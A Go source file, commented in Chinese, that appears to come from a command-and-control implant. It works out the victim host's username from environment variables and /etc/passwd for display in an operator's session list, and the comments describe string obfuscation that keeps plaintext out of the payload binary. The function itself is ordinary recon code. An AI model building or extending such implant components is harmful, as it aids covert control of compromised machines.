package main

// 用户名采集的「纯 Go 兜底链」（Linux 侧，本文件不含 build tag，便于在任意平台做单测）。
//
// 背景：植入端注册帧里的 Username 直接决定会话列表显示什么。旧实现只看
// os.Getenv("USER")/("USERNAME")，在 systemd 服务、cron、docker exec、
// ssh 命令模式（无交互 shell 环境）等场景里 USER 是空的，于是会话列表一律
// 显示 unknown —— 这是"Linux 会话用户名 unknown"的直接原因。
//
// 另一个坑：CGO_ENABLED=0（服务端构建器固定用纯 Go）时 os/user 的 user.Current()
// 只读 /etc/passwd 解析，容器里 uid 不在文件中、/etc/passwd 不存在（distroless）
// 都会返回错误；直接把错误吞掉写 "unknown" 等于把"没查到"和"查到了叫 unknown 的用户"
// 混为一谈。这里改成显式兜底链，并且**把 unknown 留给真正的最后一档**：
//
//	USER / LOGNAME / SUDO_USER 环境变量
//	  → os.Getuid() + 解析 /etc/passwd（uid 命中第 3 列，取第 1 列）
//	  → "uid:<数字>"（至少让操作员知道是哪个 uid，而不是一个无信息量的 unknown）
//	  → "unknown"（连 uid 都拿不到时的最后兜底）
//
// 全部逻辑都是可注入的纯函数（getenv / passwd 内容 / uid 都从参数进来），
// 因此 Windows 上也能用假 /etc/passwd 内容单测，见 username_test.go。

import (
	"os"
	"strconv"
	"strings"
)

// usernameEnvKeys 依次尝试的环境变量：USER/LOGNAME 是常规登录变量，
// SUDO_USER 覆盖"sudo 提权后以 root 运行、但操作员想看到原始登录用户"的场景。
var usernameEnvKeys = []string{"USER", "LOGNAME", "SUDO_USER"}

// passwdPath 是 Linux 上用户名/uid 的唯一纯 Go 数据源（CGO 关闭时 os/user 也读它）。
//
// 为什么是 var 而不是 const：服务端构建器编译前会对模板做**字符串混淆**，把字符串
// 字面量改写成 xd("...") 调用；const 要求编译期常量，一旦被改写整份载荷构建就失败
// （"value of type string is not constant"）。var 既能被混淆（明文不落二进制），
// 又不要求常量性，是模板里持有字符串字面量的安全写法。
var passwdPath = "/etc/passwd"

// parsePasswdUsername 从 /etc/passwd 内容里按 uid 找用户名。
// 纯函数：content 可以是任意假内容，因此在任何平台上都能做单测。
//
// 格式：name:passwd:uid:gid:gecos:home:shell（冒号分隔，前 3 列固定）。
// 跳过注释行、变形行（NIS 的 + / - 行、字段不足的行）。
// 命中失败返回 ("", false)，**绝不返回 "unknown"**：调用方据此决定下一档兜底。
func parsePasswdUsername(content string, uid int) (string, bool) {
	if uid < 0 || content == "" {
		return "", false
	}
	want := strconv.Itoa(uid)
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		fields := strings.Split(line, ":")
		// 至少要有 name:passwd:uid:gid 四列；NIS 兼容行的 uid 列不是纯数字，会被下面挡掉。
		if len(fields) < 4 {
			continue
		}
		if strings.TrimSpace(fields[2]) != want {
			continue
		}
		name := strings.TrimSpace(fields[0])
		if name == "" || name == "unknown" {
			// 空用户名或字面量 "unknown" 都不算命中：继续找同 uid 的其它行，
			// 避免把"文件里写着 unknown"当成采集成功。
			continue
		}
		return name, true
	}
	return "", false
}

// resolveUsernameFrom 是兜底链主体（纯函数）。
//   - getenv 取环境变量（生产传 os.Getenv，单测传假 map）；
//   - passwd/passwdErr 是 /etc/passwd 的读取结果（读取失败时 passwdErr != nil）；
//   - uid 来自 os.Getuid()（单测直接给 -1 / 0 / 1000 等）。
func resolveUsernameFrom(uid int, getenv func(string) string, passwd string, passwdErr error) string {
	for _, key := range usernameEnvKeys {
		if v := strings.TrimSpace(getenv(key)); v != "" && v != "unknown" {
			return v
		}
	}
	if passwdErr == nil {
		if name, ok := parsePasswdUsername(passwd, uid); ok {
			return name
		}
	}
	if uid >= 0 {
		// 能拿到 uid 就绝不回落 unknown：uid:1000 至少是可排查的事实。
		return "uid:" + strconv.Itoa(uid)
	}
	return "unknown"
}

// readPasswdFile 读取 /etc/passwd 的原始内容。
// 单独抽出来是为了让单测只需覆盖 resolveUsernameFrom（不碰真实文件系统）。
func readPasswdFile(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// getUsernameUnix 是 platform_unix.go 里 getUsername 的实现核心：
// 把"真实环境"收敛成一次纯函数调用，便于单测（不含 build tag，Windows 也能编译）。
func getUsernameUnix(uid int, getenv func(string) string) string {
	content, err := readPasswdFile(passwdPath)
	return resolveUsernameFrom(uid, getenv, content, err)
}
